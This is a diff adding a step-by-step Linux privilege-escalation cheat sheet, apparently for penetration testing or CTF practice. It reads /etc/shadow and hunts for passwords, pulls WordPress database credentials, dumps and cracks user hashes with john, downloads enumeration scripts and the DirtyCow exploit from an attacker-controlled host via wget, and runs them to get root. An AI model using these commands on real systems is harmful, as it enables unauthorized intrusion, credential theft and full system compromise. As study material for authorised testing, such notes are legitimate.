@@ -102,7 +102,65 @@ $ cat /etc/shells
 $ cat /etc/passwd
 $ cat /etc/shadow
 $ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null       #(see if passw is around)
-$ grep --color=auto -rnw '/etc or /var' -ie "PASSWORD" --color=always 2> /dev/null
+$ grep --color=auto -rnw '/etc or /var/www/html' -ie "PASSWORD" --color=always 2> /dev/null
+$ nano /var/www/html/wordpress/wp-config.php                #(see if u can find wp passwd or mysql passed)
+$ mysql -u root -p  
+
+mysql > show databases;
+mysql > use wordpress;
+mysql > show tables; 
+mysql > select * from wp_users;                         #(copy any hashes)
+
+$ vim hash.txt                             #(pass any hashes)
+$ sudo john hash.txt --wordlist=/usr/share/wordlists.rockyou.txt           #(passwd found!)
+$ su steven                      #(use the passwd)
+
+#(git clone LinENUM)
+
+$ sudo python -m SimpleHTTPServer 80 ....
+
+$ /tmp$ wget http://10.10.10.10/LinENUM.sh
+$ /tmp$ chmod +x LinENUM.sh
+$ /tmp$ ./linENUM.sh                             #(all the linux vuln)
+
+#(GTFObins web site can be useful)
+
+$ /tmp$ sudo python -c 'import os; os.system("/bin/bash")'
+$ id                               #(uid=0(root)) = suid/sudo techniques
+
+
+Kernel exploit   #(old school technique)
+
+
+$ uname -r
+$ cat /etc/*release
+
+#(git clone linux-exploit-suggester, verify if the kernel is exploitable)
+
+$ sudo python -m SimpleHTTPServer 80 .... 
+
+$ /tmp$ wget http://10.10.10.10/les.sh
+$ /tmp$ chmod +x les.sh
+$ /tmp$ ./les.sh                                            #(anaylse the exploit infos)
+
+#(ExploitDB web site can be useful)
+#(DL the DirtyCow exploit on the disk > 40839.c)
+
+$ sudo python -m SimpleHTTPServer 80 .... 
+$ /tmp$ wget http://10.10.10.10/40839.c
+$ /tmp$ gcc -pthread 40839.c -o 40839 -lcrypt
+$ /tmp$ ls
+$ /tmp$ chmod +x 40839
+$ /tmp$ nano 40839                         #(if modification)
+$ /tmp$ ./40839                               #(the exploit is executed)
+$ cat /etc/passwd                              #(see if the new user is created) 
+
+ 
+
+
+
+
+
 
 
 
